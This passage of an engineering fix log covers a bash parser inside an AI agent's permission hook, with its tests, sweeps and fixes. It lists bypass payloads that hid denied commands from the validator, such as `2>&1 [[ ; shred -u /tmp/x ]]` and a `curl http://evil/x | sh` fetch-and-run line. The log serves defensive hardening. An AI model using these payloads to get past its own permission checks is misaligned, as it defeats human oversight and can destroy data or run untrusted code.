`(` was not in `CMD_POSITION_WORDS`, so it *consumed* command position and a
`[[` first inside a subshell stopped being a conditional:

```
( [[ -f a && -f b ]] )                    pre-32: allow  rev 1: ask
( [[ $x == a || $x == b ]] && echo ok )   pre-32: allow  rev 1: ask
( [[ "$a" > /etc/passwd ]] )              rev 1: ask, AND a phantom write
                                          target /etc/passwd
```

bash runs each as one command (measured). `{ ( [[ … ]] ) ; }` was affected too.

**Fix / decision: `(` joins `{` in `CMD_POSITION_WORDS`.** A subshell opens a
command *list*, so the first word inside one is at command position exactly as
after `{` — and combined with §9.1 it can only do so when the `(` is itself at
command position, so `echo ( [[ ; evil ]]` (a bash syntax error) does not
become a new bypass. `>` inside the restored conditional is a string comparison
again, so the phantom write target is gone.

Scope of the decision, recorded because it is a real limitation: only the
**space-separated** `(` is seen. `(` is not a tokenizer metacharacter in this
parser, so `([[ -f a && -f b ]])` is the single word `([[` and still splits at
the `&&` → `ask`. That is *unchanged by task 32 in either direction* (the token
was never `[[` before the gate either) and it fails toward `ask`. Making `(`
a metacharacter would re-tokenize `(cmd)`, which `_strip_wrappers` and the
task-31 fd-dup pins depend on; out of scope here.

### 9.3 LOW 1 — the unconditional `word_open` clear is now pinned

`flush_current` clears `word_open` **above** its `if not current: return`
early-out. Mutation M8 (move the clear below it) left the entire rev-1 suite
green while breaking genuine comments:

```
echo $(date) # comment    fixed: ['echo','date']   M8: ['echo # comment','date']
ls $(pwd) # list          fixed: ['ls','pwd']      M8: ['ls # list','pwd']
```

No fix needed — the code was right — but nothing tested it.
`test_genuine_comment_after_a_lone_substitution_word_is_a_comment` now does,
over `$(…)`, backticks and a tab-separated comment. M8 is caught.

### 9.4 LOW 2 — a digit glued to a lifted substitution is not an fd

`_is_bare_amp_write_redirect`'s walk-back accepts `)` as a word boundary, so a
digit after a lifted `$(...)` read as an fd prefix and the `>&` destination went
invisible. bash disagrees, and the distinction is real rather than cosmetic:

```
echo a $(true)2>&/tmp/f   bash writes /tmp/f       rev 1: no target
(true)2>&/tmp/f           bash: ambiguous redirect  rev 1: no target (correct)
```

The text alone cannot separate those two `)`s — one closes a substitution that
the tokenizer lifted out, one closes a subshell it did not. The tokenizer
knows: `word_open` is exactly that state. It is now threaded through
`_check_operator(command, pos, _word_glued=...)` into the walk-back, which skips
rule 1 when set.

The same guard went on the **fd-prefix branch** (`:768`), which had the same
misreading on the ordinary redirections. Measured:

```
$ bash -c 'echo a $(true)2>/tmp/g' ; cat /tmp/g
a 2                       <-- the `2` is an ARGUMENT; `>` redirects stdout
$ bash -c 'echo a 2>/tmp/g' ; cat /tmp/g
                          <-- a bare `2>` really is an fd prefix; stdout is `a`
```

so `echo a $(true)2>/tmp/g` is now `['echo a 2']`, not `['echo a']`. Same write
target either way — this is a faithfulness pin, not a gate fix, and it is what
kills mutation M13, which otherwise survived the whole suite.

### 9.5 INFO — the ground-truth test now compares contents, not just counts

`test_bash_runs_what_the_parser_reports` asserted only
`len(sub_commands) == len(runs)`; a parser splitting at the wrong offsets but
landing on the right count passed. It now also compares the **multiset of
command words** on both sides. A multiset rather than a sequence because a
command substitution runs *before* its enclosing command in bash and is emitted
*after* it here; a helper `_head_word` skips the `KEY=VALUE` prefix that bash
reports inside `$BASH_COMMAND` and the parser emits as its own ENV token.

The corpus grew 19 → 29 payloads: four ENV-prefix shapes, three keyword-in-
argument shapes, the subshell conditional, `echo $(pwd) # comment`, and
`X=1 printf hi`. `test_bracket_argument_does_not_downgrade_a_deny` gained two
ENV-prefix payloads, per the brief.

### 9.6 Verification

**Suite.** `tests/run_all_tests.py`: **1419 → 1433 ran, OK, 1 skipped**
(`test_headless_spawn`, unchanged). Parser self-test **107 passed / 0 failed**.
`TestSeparatorSuppressionTokens` 26 → **40 methods, 241 subtests**.
`TestAmpersandIsACommandSeparator` **17 methods, still green**.
`TestTrapHandlerAgainstRealBash` **240 cases, 6 tests / 275 subtests, no
exemption list** — `_TASK_31_KNOWN_FAILING` stayed deleted.
`tests/scenario_check.py` reports the identical pre-existing failure
(`git push --force`) against the rev-1 parser and against this one.

**Differential sweep — real traffic.** 3837 command occurrences, **2073
distinct**, harvested from `~/.claude/bash_hook_debug.log` + the five rotated
`.gz` (459 hook invocations between them; both the one-line `Raw input:` records
and the pretty-printed `Parsed input:` blocks, since the former are truncated)
and from `~/.claude/permission_requests.jsonl`. Each replayed through the rev-1
parser and this one under the real `SettingsLoader`:

```
verdict changes: 0    split changes: 0    write-target changes: 0    of 2073
```

The corpus does exercise the changed surface — 187 commands with a leading
`KEY=`, 807 with an assignment anywhere, 35 with `[[`, 27 with a
space-separated `(`, 1149 with `>&`, 537 with a keyword that could sit in
argument position, 31 with `case`.

**Differential sweep — bash faithfulness.** Zero changes on real traffic proves
no regression, not faithfulness; the claim §5 asks for needs commands that DID
change. 493 synthetic cases (16 prefixes × 5 separators × 6 bodies, plus 13
hand-written shapes), all inert, each ground-truthed with `set -T` + a DEBUG
trap on `$BASH_COMMAND`. The one-sided property — *bash never runs a command
the parser did not report* — measured as multiset containment of command words
with scaffolding (`!`, `if`, `while`, `(`, `{`, assignment prefixes) skipped on
both sides:

```
                bash ran a command the parser never reported
rev 1 parser    72  of 493   (313 executable; 180 bash refuses as syntax errors)
this parser      0  of 493
```

Moves toward `allow`, all of them: **2**, both `( [[ a == a && b == b ]] )` and
its `{ … }` wrapping — the §9.2 restoration. bash runs each as exactly one
command, the one the parser now reports, and it is the pre-task-32 verdict. So
the claim stands in the form §5 demands: **every move toward allow is
bash-faithful**, and there are two of them.

**Mutation matrix.** Run in a `/tmp` copy (`cp -a`), never in the repo; the
whole of `tests/test_integration_pretool.py` per mutation. M1–M7 are the
reviewer's rev-1 matrix, M8–M9 the round-2 additions, M10–M14 cover the new
gate. (The `/tmp` copy has 2 baseline failures of its own —
`test_dot_alias_does_not_over_match_relative_path`,
`test_escaping_relative_path_is_not_workspace_binary` — which are
workspace-path artifacts of running outside the real checkout and are excluded
below; both pass in the repo.)

```
M1  drop at_cmd_start from the [[ gate        CAUGHT  test_bracket_argument_closed_later_still_splits,
                                                      test_assignment_prefix_*, test_bash_runs_what_the_parser_reports
M2  drop the unterminated-[[ retry            CAUGHT  test_unterminated_conditional_splits_and_asks (+ _does_not_downgrade_a_deny)
M3  drop `not word_open` from the # gate      CAUGHT  test_hash_after_a_glued_substitution_is_not_a_comment
M4  drop the >& -> &> normalization           CAUGHT  test_amp_write_redirect_synonym_* (3), test_digit_glued_to_a_substitution_is_not_an_fd_prefix
M5  drop the fd-prefix guard (rule 1)         CAUGHT  test_fd_duplication_forms_are_unchanged, test_subshell_glued_digit_is_still_an_fd_prefix
M6  drop `not current` from the # gate        CAUGHT  test_hash_mid_word_is_an_argument, test_midword_hash_* (3), test_fragment_url_keeps_its_fragment
M7  >& unconditionally &> (rule 2 dropped)    CAUGHT  test_fd_duplication_forms_are_unchanged, test_non_separator_forms_are_unchanged
M8  `word_open = False` below the early-out   CAUGHT  test_genuine_comment_after_a_lone_substitution_word_is_a_comment,
                                                      test_digit_glued_to_a_substitution_is_an_argument
M9  never clear in_conditional on ]]          CAUGHT  test_conditional_at_command_position_still_suppresses (+7 more)
M10 keyword in ARGUMENT position reopens      CAUGHT  test_keyword_in_argument_position_does_not_open_a_conditional (+ _launder_the_tail)
M11 restore the ENV carve-out (the CRITICAL)  CAUGHT  test_assignment_prefix_does_not_open_a_conditional (+ _downgrade_a_deny),
                                                      test_bracket_argument_does_not_downgrade_a_deny
M12 drop `(` from CMD_POSITION_WORDS          CAUGHT  test_grouping_opener_keeps_command_position, test_grouped_conditional_invents_no_write_target
M13 drop `not word_open` from the fd branch   CAUGHT  test_digit_glued_to_a_substitution_is_an_argument
M14 drop word_glued from the walk-back        CAUGHT  test_digit_glued_to_a_substitution_is_not_an_fd_prefix
```

**M13 initially SURVIVED** the full suite — the same trap as rev 1's M1, and the
reason §9.4 grew a second test. Its only observable effect is a *dropped
argument* (`['echo a']` for `echo a $(true)2>/tmp/g`, where bash's word is
`<subst>2`), never a changed verdict, so nothing that asserted on verdicts or
write targets could see it. Recorded because "the mutation is unobservable" and
"the mutation is untested" look identical until you measure which.

### 9.7 Tests added (14 methods, all watched to fail first)

`test_assignment_prefix_does_not_open_a_conditional` ·
`test_assignment_prefix_does_not_launder_the_tail` ·
`test_assignment_prefix_does_not_downgrade_a_deny` ·
`test_keyword_in_argument_position_does_not_open_a_conditional` ·
`test_keyword_in_argument_position_does_not_launder_the_tail` ·
`test_assignment_prefix_does_not_open_a_case_pattern_list` ·
`test_keyword_still_opens_command_position_where_bash_agrees` (guard — green
before and after) · `test_grouping_opener_keeps_command_position` ·
`test_grouped_conditional_invents_no_write_target` ·
`test_subshell_still_splits_on_real_separators` ·
`test_genuine_comment_after_a_lone_substitution_word_is_a_comment` (guard for
M8) · `test_digit_glued_to_a_substitution_is_not_an_fd_prefix` ·
`test_digit_glued_to_a_substitution_is_an_argument` ·
`test_subshell_glued_digit_is_still_an_fd_prefix`.

The two guards passed before the fix by design; the other twelve failed, with
the round-1 output quoted in §9.1–§9.4.

### 9.8 Residual risk (supersedes §8.9 where they differ)

- **Still not installed.** Unchanged and still the largest exposure: the
  CRITICAL in §9.1 is live in `~/.claude/hooks/` until someone re-runs
  `./install-claude-config.sh`. Operator action.
- **`([[ … ]])` glued, with no space, still mis-splits** toward `ask` (§9.2).
  Unchanged by this task in either direction.
- **`X=1 time [[ … ]]`** is the one assignment-prefix + reserved-word form bash
  accepts and this parser does not. False ask; no instance in the harvest.
- **`X=1 case a in …`** now folds under a `case` head instead of emitting the
  arm bodies (§9.1). bash refuses the string outright; the verdict is `ask`.
- **The parser is still a hand-written tokenizer, not bash.** Two rounds of
  review found the same defect behind two different doors that a keyword table
  did not model. The measured claim in `state.md` was corrected to say so.
- Everything else in §8.9 stands unchanged.

### 9.9 Documentation corrected

- `tasks/22_agent_permission_flows/state.md` claimed *"no known parser path
  hides a sub-command from classification"*. §9.1 refuted it the same day. The
  entry now states the measured claim (zero hidden commands over the 493-case
  sweep) and says explicitly why the universal is not earned.
- §7 and §8.10 said name resolution and the NUL fail-open were *"not filed
  yet"*. Both were filed at `ca2a81a`, as
  [task 33](./33_name_resolution_not_vouched.md) and
  [task 34](./34_nul_byte_fail_open.md). Corrected in both places, and in
  `state.md`.

---

## 10. Fix log (rev 3 — fixer, after the round-3 review FAILED)

**Status:** done · **Landed:** 2026-08-27 · **Baseline commit:** `ca2a81a`
**Still not installed.** `./install-claude-config.sh` was not run.
`~/.claude/hooks/` still carries the round-1 code and therefore §9.1's CRITICAL
as well as §10.1's.

Two review rounds each found the same defect behind a different door and each
was closed by adding one more condition to a hand-maintained flag. Round 3
found a third door — and, walking the tokenizer's own paths, a **fourth** the
review had not enumerated. This round does not add a fifth condition: it
**replaces the mechanism**.

### 10.1 CRITICAL — the door class, not the door

`flush_current` updated `at_cmd_start` *below* its `if not current: return`
early-out. So **any construct that consumes a real bash word without leaving
characters in the token buffer never consumed command position.** Measured on
the round-2 parser, live merged settings (`allow=295 deny=9 ask=0`),
`shred -u` denied:

```
2>&1 [[ ; shred -u /tmp/x ]]                 round 2: allow    round 3: deny
1>&2 [[ ; shred -u /tmp/x ]]                 round 2: allow    round 3: deny
$(true) [[ ; shred -u /tmp/x ]]              round 2: allow    round 3: deny
`true` [[ ; shred -u /tmp/x ]]               round 2: allow    round 3: deny
<(true) [[ ; shred -u /tmp/x ]]              round 2: allow    round 3: deny
>(true) [[ ; shred -u /tmp/x ]]              round 2: allow    round 3: deny
cat <<EOF [[ ; shred -u /tmp/x ]]            round 2: allow    round 3: deny
> [[ ; shred -u /tmp/x ]]                    round 2: allow    round 3: deny   <-- FOURTH door
3<> [[ ; shred -u /tmp/x ]]                  round 2: allow    round 3: deny   <-- FOURTH door
git status ; 2>&1 [[ ; shred -u /tmp/x ]]    round 2: allow    round 3: deny
time $(true) [[ ; shred -u /tmp/x ]]         round 2: allow    round 3: deny
! 2>&1 [[ ; shred -u /tmp/x ]]               round 2: allow    round 3: deny
```

The **fourth door** was not in the review: a redirection whose TARGET is the
next token (`> [[ …`, `2> [[ …`, `< [[ …`, `3<> [[ …`). The REDIRECT is emitted
with an empty buffer, so the flag stayed open and the `[[` that followed — the
redirect's own target — was read as the reserved word. It came out of walking
the tokenizer's `continue` paths, not out of imagining prefixes, which is the
whole point of §10.3.

`2>&1 [[ ; curl http://evil/x | sh ]]` still verdicts `allow` after the fix,
and that is **not** a parser defect: this machine's merged settings allow
`curl` outright (`curl http://evil/x` alone verdicts `allow`). The parser now
reports `['[[', 'curl http://evil/x', 'sh ]]']` — three sub-commands, each
classified on its own. Verified by probing the pieces separately.

### 10.2 The fix — reserved-word position, derived from the token stream

`bash_command_parser.py`. The `at_cmd_start` flag is **gone**. In its place:

```python
def _at_reserved_word_position(self, tokens, recorded) -> bool:
    if not tokens:
        return True                                    # start of input
    token_type, token_value, _offset = tokens[-1]
    if token_type == 'OP':
        return True                                    # a separator opens a command
    if token_type == 'WORD' and token_value in self.CMD_POSITION_WORDS:
        return recorded.get(len(tokens) - 1, False)    # a keyword, only if IT was one
    return False            # WORD, ENV, REDIRECT, CMD_SUBST, CASE_PATTERN
```

`flush_current` reads it once, before appending, and records the answer under
the new token's index:

```python
at_cmd_start = self._at_reserved_word_position(tokens, reserved_word_position)
reserved_word_position[len(tokens)] = at_cmd_start
```

`emit_separator` no longer sets anything — the `OP` token it appends *is* the
signal.

**Why no construct can bypass it, in four steps.**

1. The rule is a total function of the **type of the last emitted token**, and
   the five types in its `return False` line plus `OP` are *every* type this
   tokenizer appends. `test_no_token_type_escapes_the_rule` collects the types
   actually emitted over the whole generated corpus and fails if a sixth
   appears; `test_the_reserved_word_rule_is_total_over_token_types` asserts
   every branch directly, including the two the tokenizer cannot currently
   reach.
2. Consuming source without emitting a token cannot change the answer, because
   the answer does not depend on source at all — only on `tokens`. The entire
   round-1/2/3 defect class was "advanced without updating the flag"; there is
   no flag to skip updating.
3. Emitting a token *does* change the answer, and in the safe direction by
   default: every type except `OP` closes the position. A future
   `tokens.append(...)` at a new site therefore closes reserved-word
   recognition unless it appends an `OP`, which is exactly what a new command
   separator would be.
4. The only transparent case is a keyword, and it is transparent **only when it
   was itself at reserved-word position** — a recurrence, not a rescan, resolved
   from `recorded`. Measured: `> /tmp/z if [[ -f x ]]` is `if: command not
   found`, so an `if` in redirect-target position does not reopen anything. A
   WORD with no recorded answer reads as CONSUMED, so a future path that
   appends a WORD without recording fails toward `ask`.

**Nothing was kept alongside it.** `word_open` remains, but only for the `#`
word-boundary test and the `>&` walk-back; it is deliberately *not* consulted
for position, because every site that sets it emits a `CMD_SUBST` first and
`CMD_SUBST` already answers `False`. That implication is measured, not asserted
— `test_word_open_paths_emit_a_substitution_token`.

**bash agrees, measured** (each of these is a syntax error or a
"command not found"):

```
2>&1 if true; then :; fi        $(true) if true; then :; fi
> /tmp/z if true; then :; fi    X=1 if true; then :; fi
2>&1 [[ -f x ]]                 <(true) [[ -f x ]]
2>&1 { :; }                     $(true) { :; }
2>&1 case a in a) :;; esac      $(true) case a in a) :;; esac
2>&1 ( : )                      > /tmp/z if [[ -f x ]]        <- `if: command not found`
```

**§9.1's `time` exception was wrong, and is retracted.** Round 2 recorded
`X=1 time true` as the one form bash accepts after an assignment prefix, and
listed `X=1 time [[ … ]]` as a false ask in §9.8. Measured now:

```
$ bash -c 'X=1 time [[ -f /etc/passwd ]]'
  time: cannot run [[: No such file or directory
$ bash -c '2>&1 time if true; then :; fi'
  bash: syntax error near unexpected token `then'
```

The `time` that runs there is `/usr/bin/time`, not the bash keyword, and the
`[[` after it is an argument. So there is **no exception**: after a redirection,
an assignment prefix or an expansion, bash recognizes no reserved word at all,
and the parser now matches exactly. §9.8's "false ask" entry is withdrawn.

### 10.3 The test corpus is derived from the tokenizer, not from imagination

Three doors got through 40 test methods because every payload's prefix was
hand-listed. `tests/test_integration_pretool.py` now carries
`_RESERVED_WORD_POSITION_PATHS`: **51 rows, one per path in
`_tokenize_with_quotes`' main loop that can consume source before the next
token** — enumerated by walking its `continue` / early-return statements. Each
row names its tokenizer path and carries bash's own answer (`opens`) for that
position: 15 OPEN, 36 CONSUMED.

Everything is generated from it — nothing is hand-listed:

| test | what it generates |
|---|---|
| `test_bash_agrees_with_the_reserved_word_position_table` | the `opens` column, measured against real bash |
| `test_no_tokenizer_path_reopens_reserved_word_position` | 36 CONSUMED × `[[ ; nslookup … ]]` |
| `test_no_tokenizer_path_launders_a_deny` | 36 CONSUMED × `[[ ; shred … ]]` → must `deny` |
| `test_no_tokenizer_path_opens_a_case_pattern_list` | 36 CONSUMED × a `case` statement |
| `test_open_paths_still_recognise_the_reserved_word` | 15 OPEN — the reverse-direction guard |
| `test_open_paths_still_open_a_case_pattern_list` | 15 OPEN — the reverse-direction guard |
| `test_bash_never_runs_a_command_the_parser_did_not_report` | 51 × 4 payloads = 204 cases, DEBUG-trap ground truth |

The `opens` column is not asserted, it is **measured**: `_bash_reads_a_reserved_word`
runs `prefix + "[[ a > FILE ]] ; printf T" + suffix` and reports whether the
file was created. Inside a conditional `>` is a string comparison and creates
nothing; outside one it is a redirection and creates the file. That
discriminator is short-circuit-free, unlike `&&`/`||`, whose right-hand side
runs or not depending on whether the folded head happened to succeed — the
first version of this test used `&&` and read `X=1 [[ a && b ]]` as OPEN for
exactly that reason.

**LOW (the brief's) — `_BASH_GROUND_TRUTH`'s systematic gap is closed.** Ten
payloads were added putting `[[` after a fused redirect, a stacked pair, a read
redirect, a heredoc, an in-quote substitution, a nested-arithmetic
substitution, a separator-then-redirect, an ENV-then-redirect and a
word-then-redirect. The full 204-case cross-product lives in the generated
corpus, asserted with the **one-sided** property rather than count equality —
and that is a category, not an exemption: bash reports a command *unexpanded*
(`$(true) [[`), reports redirect-only commands the parser drops as empty
sub-commands (`> [[`), and short-circuits an `&&` whose left side the parser
still reports. All three make the PARSER report *more* than bash runs, which
costs a prompt; under-reporting is the bypass.

### 10.4 Tests watched to fail first

The new class run against the **round-2** parser (a `cp -a` copy, round-2's
`bash_command_parser.py` dropped in): **4 methods fail, 42 subtest failures**;
the other 9 are guards, green before and after. Verbatim:

```
test_no_tokenizer_path_reopens_reserved_word_position (path='fused_redirect_21')
  AssertionError: 'nslookup example.com ]]' not found in
                  ['[[ ; nslookup example.com ]]'] : the tail is still hidden behind '2>&1 '
   ... and 12 more paths: fused_redirect_12, fused_redirect_stack,
       redirect_target_next, subst_paren, subst_backtick, procsub_in,
       procsub_out, redirect_target_subst, keyword_then_redirect,
       keyword_then_subst, sep_then_redirect, time_then_subst

test_no_tokenizer_path_launders_a_deny (path='fused_redirect_21')
  AssertionError: 'deny' != 'ask'                       (13 paths, same list)

test_no_tokenizer_path_opens_a_case_pattern_list (path='fused_redirect_21')
  AssertionError: 'CASE_PATTERN' unexpectedly found in
                  {'OP', 'REDIRECT', 'CASE_PATTERN', 'WORD'}   (13 paths)

test_a_redirect_in_the_second_stage_is_still_consumed
        (command='git status ; 2>&1 [[ ; shred -u /tmp/x ]]')
  AssertionError: 'deny' != 'ask'                       (3 commands)
```

The 9 guards — green before AND after, and nothing here claims otherwise:
`test_bash_agrees_with_the_reserved_word_position_table`,
`test_open_paths_still_recognise_the_reserved_word`,
`test_open_paths_still_open_a_case_pattern_list`,
`test_bash_never_runs_a_command_the_parser_did_not_report` (it fails on the
round-2 parser too, but as a *sweep*, not as a targeted pin — counted with the
sweep in §10.5), `test_word_open_paths_emit_a_substitution_token`,
`test_no_token_type_escapes_the_rule`,
`test_the_reserved_word_rule_is_total_over_token_types`,
`test_a_keyword_is_transparent_only_at_reserved_word_position`,
`test_leading_fd_duplication_still_corrupts_the_head`.

### 10.5 Faithfulness sweep — the one-sided property, four parsers, one corpus

*bash never runs a command the parser did not report*, ground-truthed with
`set -T` and a `DEBUG` trap on `$BASH_COMMAND`, inert payloads only. Corpus:
**801 cases** — 49 prefix families × 16 payloads + 17 hand-written — with the
prefix families enumerated from the tokenizer's `continue`/early-return paths
(the same enumeration as §10.3). bash executes something in 580 of them; the
other 221 it refuses as syntax errors.

```
                                          bash ran a command the parser never reported
HEAD (ca2a81a, pre-task-32)               275 of 801
task 32 rev 1                              89
task 32 round 2                            54
task 32 round 3 (this)                      7
```

Both intermediate parsers were **reconstructed** from the current source by
inverting the documented §9 / §8 edits, and each reconstruction was validated
against this file's own recorded measurements before its numbers were trusted
— rev 1 must fold `X=1 [[ ; … ]]`, must split `( [[ -f a && -f b ]] )` (the §9.2
regression), and must report no write target for `echo a $(true)2>&/tmp/f`
(§9.4); round 2 must fix all three and still fold `2>&1 [[ ; … ]]`. All eight
checks pass. The reviewer's numbers (711 / 227 / 131) were measured on a
different corpus; the ordering and the shape of the improvement match.

Round 3's residual **7 are one prefix family** — `2>&- `, and the same 7 appear
under rev 1 and round 2, so this task neither introduced nor left them:

```
2>&- printf ok ; printf T    bash: ['printf ok 2>&-', 'printf T']
                             parser: ['2 - printf ok', 'printf T']
```

A LEADING `n>&-`/`n>&m` leaks its fd words into the command, so the head becomes
`2`. That falsifies `_FD_DUP_FORMS_UNCHANGED`'s comment ("extra ARGUMENTS on an
existing sub-command, never a new head") for the leading position — a genuine
finding, and a **different defect** from this task's. Direction, measured:
`2>&- shred -u /tmp/x` → `ask` where `shred -u /tmp/x` → `deny`, so it can
downgrade a deny to a prompt, never to an allow. Fixing it means changing
`_FD_DUP_FORMS_UNCHANGED`, which this round's brief pins as certified-correct,
so it is **recorded rather than fixed**: carried as a `known_gap` COLUMN of the
path table (not a list beside it), pinned as it stands by
`test_leading_fd_duplication_still_corrupts_the_head`, and listed in §10.9.

### 10.6 Differential sweep — real traffic

Corpus: **2066 distinct** commands (3380 occurrences) harvested from
`~/.claude/bash_hook_debug.log` plus all five rotated `.gz` archives and every
`command` field in `~/.claude/permission_requests.jsonl`. Replayed under the
real `SettingsLoader` — asserted in the harness before any result is trusted:
**allow=295, deny=9, ask=0**. 0 parse exceptions in every pass.

```
round 2 -> round 3:   verdict changes 0    split changes 0    write-target changes 0
HEAD    -> round 3:   verdict changes 0    split changes 2    write-target changes 0
                      commands with FEWER sub-commands: 0 in both
```

The two HEAD→round-3 split changes are §8.6's, unchanged: the `${file#res://}`
parameter expansion and the `# Email Portal` heredoc heading.

The corpus does exercise the changed surface: **1152** commands carry a fused
`2>&1`/`1>&2`, **1618** an fd-prefixed redirect, **1721** a redirection of some
kind, **458** a `$(…)`, **44** a backtick, **17** a process substitution, **140**
a heredoc, **187** a leading `KEY=`, **796** an assignment anywhere, **35** a
`[[`, **31** a `case`, **537** a keyword that could sit in argument position.
Zero changes across all of that is the expected result and not a weak one: the
derivation differs from round 2 only where a reserved word follows one of those
constructs, which bash rejects, so no real script contains it.

### 10.7 Every move toward allow, and why each is bash-faithful

Zero real-traffic changes proves no regression, not faithfulness. **686
synthetic cases** (the 49 prefix families × 14 classifiable bodies) replayed
through round 2 and round 3 under the real settings:

```
allow -> deny    44      <- the deny-defeating bypasses of §10.1 closing
allow -> ask     22
ask   -> deny     4
deny  -> ask      1      \  the two moves toward allow
ask   -> allow    1      /
```

*Move 1 — `> [[ ; git status ]]`, `ask` → `allow`.* bash, measured:

```
$ bash -c 'set -T; trap … DEBUG; > [[ ; printf T ]]'
  RUN[> [[]                 <- a redirect-only command; creates a file named `[[`
  RUN[printf T ]]]          <- and then this, which is ALL that runs
```

The parser now reports exactly `['git status ]]']`. The old `ask` was the
validator being blind, not careful: round 2 folded the tail into
`['; git status ]]']`, whose head is the literal `;`, which matches no pattern.
Controls that already allowed before the fix: `> /tmp/zzctl ; git status` →
`allow`, and `git status ]]` on its own → `allow`.

*Move 2 — `> case a in a) shred -u /tmp/x ;; esac`, `deny` → `ask`.* bash,
measured: **`syntax error near unexpected token ')'` — nothing runs at all.**
Round 2 entered `case` pattern mode where bash refuses the string outright and
emitted the arm body as its own sub-command; round 3 reads the `case` as the
redirect's target, as bash does. No command executes, so no verdict can be
unfaithful. Same category as §9.1's accepted `X=1 case …` decision. Note this
is *not* a general `case` downgrade: `2>&1 case a in a) shred -u /tmp/x ;; esac`
still verdicts `deny`, because the folded sub-command still matches the deny
pattern.

So the claim stands in the form §5 demands: **every move toward allow is
bash-faithful**, and there are two of them.

### 10.8 Mutation matrix — 23 mutations, 23 caught

Run in a `/tmp` copy (`cp -a`), never in the repo; the whole of
`tests/test_integration_pretool.py` per mutation. M1–M14 are the rev-1 and
round-2 matrices re-anchored on the current source (M10 and M11 are subsumed by
M17 and M21, which mutate the same rules in their new form). The `/tmp` copy has
2 baseline failures of its own —
`test_dot_alias_does_not_over_match_relative_path`,
`test_escaping_relative_path_is_not_workspace_binary`, workspace-path artifacts
of running outside the checkout — excluded below; both pass in the repo.

```
M1  drop the reserved-word gate on the `[[` opener   CAUGHT (222)  test_assignment_prefix_*, test_a_redirect_in_the_second_stage_*
M2  drop the unterminated-`[[` retry                 CAUGHT (2)    test_unterminated_conditional_splits_and_asks
M3  drop `not word_open` from the `#` gate           CAUGHT (4)    test_hash_after_a_glued_substitution_is_not_a_comment
M4  drop the `>&` -> `&>` normalization              CAUGHT (13)   test_amp_write_redirect_synonym_* (3)
M5  drop the fd-prefix guard (`>&` rule 1)           CAUGHT (5)    test_fd_duplication_forms_are_unchanged
M6  drop `not current` from the `#` gate             CAUGHT (22)   test_hash_mid_word_is_an_argument, test_midword_hash_*
M7  make `>&` unconditionally `&>`                   CAUGHT (16)   test_fd_duplication_forms_are_unchanged
M8  clear `word_open` BELOW the early-out            CAUGHT (5)    test_genuine_comment_after_a_lone_substitution_word_*
M9  never clear `in_conditional` on `]]`             CAUGHT (50)   test_conditional_at_command_position_still_suppresses
M12 drop `(` from CMD_POSITION_WORDS                 CAUGHT (8)    test_grouping_opener_keeps_command_position
M13 drop `not word_open` from the fd-prefix branch   CAUGHT (5)    test_digit_glued_to_a_substitution_is_an_argument
M14 drop `word_glued` from the `>&` walk-back        CAUGHT (2)    test_digit_glued_to_a_substitution_is_not_an_fd_prefix
--- round 3, against the new mechanism ---
M15 a REDIRECT leaves the position OPEN              CAUGHT (42)   test_no_tokenizer_path_launders_a_deny, test_a_redirect_in_the_second_stage_*
M16 a CMD_SUBST leaves the position OPEN             CAUGHT (31)   test_no_tokenizer_path_launders_a_deny
M17 a keyword is transparent unconditionally         CAUGHT (85)   test_keyword_in_argument_position_does_not_launder_the_tail
M18 an unrecorded WORD defaults to OPEN              CAUGHT (1)    test_the_reserved_word_rule_is_total_over_token_types
M19 record the position AFTER the append             CAUGHT (114)  test_conditional_is_recognised_after_a_keyword
M20 never record the position at all                 CAUGHT (38)   test_conditional_is_recognised_after_a_keyword
M21 an ENV prefix leaves the position OPEN           CAUGHT (41)   test_assignment_prefix_does_not_open_a_conditional
M22 read the position AFTER the append               CAUGHT (258)  test_assignment_prefix_*, test_a_keyword_is_transparent_*
M23 a CASE_PATTERN leaves the position OPEN          CAUGHT (1)    test_the_reserved_word_rule_is_total_over_token_types
```

**M18 and M23 initially SURVIVED the entire suite.** Both mutate branches the
tokenizer cannot currently reach — every WORD arrives recorded (`flush_current`
records before appending), and a `CASE_PATTERN` is only ever followed by another
`CASE_PATTERN` or by the `;` the arm's `)` emits. This is the trap rev 1's M1
and round 2's M13 both hit: *"the mutation is unobservable"* and *"the mutation
is untested"* look identical until you measure which. The fix was to lift the
rule out of the closure into `_at_reserved_word_position(tokens, recorded)`, a
pure method, so `test_the_reserved_word_rule_is_total_over_token_types` can
assert every branch — including the unreachable ones — directly. Both mutations
now die on that one test. The refactor is also what makes the rule readable on
its own, which §10.2 step 1 depends on.

Whole-mechanism revert (replacing the derivation with round 2's flag) is the
`/tmp` run in §10.4: 42 subtest failures.

### 10.9 Verification summary

| | round 2 | round 3 |
|---|---|---|
| `tests/run_all_tests.py` | 1433 ran, OK, 1 skipped | **1446 ran, OK, 1 skipped** |
| `bash_command_parser.py` self-test | 107 passed / 0 failed | 107 passed / 0 failed |
| `TestTrapHandlerAgainstRealBash` | 240 cases, 6 tests / 275 subtests | **unchanged, no exemption list** (`_TASK_31_KNOWN_FAILING` still absent) |
| `TestAmpersandIsACommandSeparator` | 17 methods / 21 subtests | **17 / 21, green** |
| `TestSeparatorSuppressionTokens` | 40 methods / 241 subtests | 40 methods / **251 subtests** |
| `TestReservedWordPositionIsDerivedFromTokens` | — | **13 methods / 402 subtests** |
| `tests/scenario_check.py` | 2 pre-existing failures | **identical failure lines, diffed** |
| faithfulness sweep (801 cases) | 54 hidden | **7 hidden**, all one pre-existing family |
| real traffic (2066 distinct) | — | **0 verdict / 0 split / 0 write-target changes** |

> **CORRECTION (round 4).** The "7 hidden, all one pre-existing family" row is
> **true of that corpus and misleading as a claim**. The number is right; the
> corpus was the problem. Round 3's 801 cases were generated from the
> tokenizer's own `continue` paths, and such an enumeration structurally cannot
> contain an operator the parser does not know — so it could not see `>|` or
> `1>&`, two LIVE allow-producing families on the round-3 parser. Measured on
> the operator-space corpus (§11.9's sweep, `TestBashOperatorTableIsBashs`)
> the same parser hides **21**, not 7. Read
> the row as *"7 hidden on the path-derived corpus"*, never as *"7 hidden"*.

Blast radius re-probed consumer by consumer, all six §10.1 payloads:
`permissions_mcp_lib._build_validator()` → `deny`;
`pretool_hook.BashPermissionValidator` → `deny`;
`.claude/hooks/telegram_permission_router.py` builds its validator inline from
the same two modules and so inherits identically; `tests/scenario_check.py`
byte-identical.

### 10.10 Residual risk (supersedes §9.8 where they differ)

- **Still not installed.** Unchanged and still the largest exposure: §9.1's and
  §10.1's CRITICALs are live in `~/.claude/hooks/` until someone re-runs
  `./install-claude-config.sh`. Operator action.
- **NEW — a LEADING `n>&m`/`n>&-` corrupts the sub-command head.**
